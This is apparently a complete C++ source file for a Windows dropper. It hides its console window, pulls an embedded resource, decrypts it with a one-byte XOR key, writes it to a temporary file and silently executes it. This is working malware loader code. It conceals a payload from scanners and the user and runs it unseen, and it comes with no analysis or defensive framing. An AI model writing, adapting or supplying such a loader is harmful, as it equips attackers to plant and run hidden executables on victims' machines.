#include <iostream>
#include <windows.h>
#include <stdio.h>

unsigned char *GetResource(int resourceId, char* resourceString, unsigned long* dwSize) {
    HGLOBAL hResData;
    HRSRC   hResInfo;
    unsigned char* pvRes;
    HMODULE hModule = GetModuleHandle(NULL);

    if (((hResInfo = FindResource(hModule, MAKEINTRESOURCE(resourceId), resourceString)) != NULL) &&
        ((hResData = LoadResource(hModule, hResInfo)) != NULL) &&
        ((pvRes = (unsigned char *)LockResource(hResData)) != NULL))
    {
        *dwSize = SizeofResource(hModule, hResInfo);
        return 	pvRes;
    }
    // quit if no resource found
    *dwSize = 0;
    return 0;
}

int main() {
    // Hide console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Get embedded resource
    unsigned long dwSize;
    unsigned char* resourcePtr = GetResource(132, "BIN", &dwSize);

    // Decrypt the resource raw data
    char key = 'k';
    char* decrypted = (char*)malloc(dwSize); // Dynamic allocation to handle large sizes
    if (!decrypted) {
        printf("Memory allocation failed\n");
        return -1;
    }

    for (unsigned long i = 0; i < dwSize; i++)
        decrypted[i] = resourcePtr[i] ^ key;

    // Create a temporary file name
    WCHAR tempPath[MAX_PATH];
    WCHAR tempFileName[MAX_PATH];
    if (!GetTempPathW(MAX_PATH, tempPath) ||
        !GetTempFileNameW(tempPath, L"PRE", 0, tempFileName)) {
        printf("Failed to create temp file name\n");
        free(decrypted);
        return -1;
    }

    // Write binary data to the temporary file
    HANDLE hFileWrite = CreateFileW(tempFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFileWrite == INVALID_HANDLE_VALUE) {
        printf("Failed to create temp file\n");
        free(decrypted);
        return -1;
    }

    DWORD written = 0;
    if (!WriteFile(hFileWrite, decrypted, dwSize, &written, NULL)) {
        printf("Failed to write to temp file\n");
        CloseHandle(hFileWrite);
        free(decrypted);
        return -1;
    }

    // Clean up
    CloseHandle(hFileWrite);
    free(decrypted);

    // Execute the temporary file
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    if (!CreateProcessW(tempFileName, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("Failed to create process\n");
        return -1;
    }

    // Close process and thread handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
